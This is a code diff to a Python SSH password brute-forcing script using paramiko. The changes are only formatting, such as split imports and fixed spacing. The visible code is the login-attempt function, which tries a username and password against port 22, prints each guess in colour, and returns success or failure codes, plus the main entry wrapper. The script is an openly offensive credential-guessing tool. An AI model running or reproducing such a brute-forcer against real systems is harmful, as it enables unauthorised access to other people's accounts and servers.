@@ -1,20 +1,27 @@
-import paramiko, sys, os, socket, termcolor, argparse, threading, time
+import argparse
+import os
+import paramiko
+import socket
+import sys
+import termcolor
+import threading
+import time
 
 stop_flag = 0
 
 
-def ssh_connect(username: str, password: str, host: str, code: int =0) -> int:
+def ssh_connect(username: str, password: str, host: str, code: int = 0) -> int:
     """Returns response code (int) 0:success, 1:authError, 2:connectionError"""
     global stop_flag
     ssh_client = paramiko.SSHClient()
     ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    try :
+    try:
         termcolor.cprint(f'[*] Attempting to connect to {username}@{host} with password: {password}', "yellow")
         # port 22 is set default in paramiko, declared explicitly for clarity
         ssh_client.connect(hostname=host, port=22, username=username, password=password)
     except paramiko.AuthenticationException:
         code = 1
-        termcolor.cprint(f'[!] Password: {password} incorrect for user: {username} ','red')
+        termcolor.cprint(f'[!] Password: {password} incorrect for user: {username} ', 'red')
     except socket.error as e:
         code = 2
         termcolor.cprint(e, "red")
@@ -75,9 +82,5 @@ if __name__ == "__main__":
     try:
         cli_args = get_arguments()
         main(cli_args)
-    except :
+    except:
         termcolor.cprint(f"[!] Something went wrong, exiting...", "red")
-
-
-
-
